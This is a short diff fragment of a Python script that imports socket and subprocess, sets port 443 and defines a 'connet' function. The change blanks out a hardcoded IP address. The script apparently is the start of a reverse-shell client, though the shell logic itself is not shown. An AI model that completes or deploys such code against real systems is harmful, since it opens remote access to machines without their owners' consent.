@@ -1,7 +1,7 @@
 import socket
 import subprocess
 from time import sleep
-IP = '172.31.170.108'
+IP = ''
 PORT = 443
 
 def connet(ip,port):
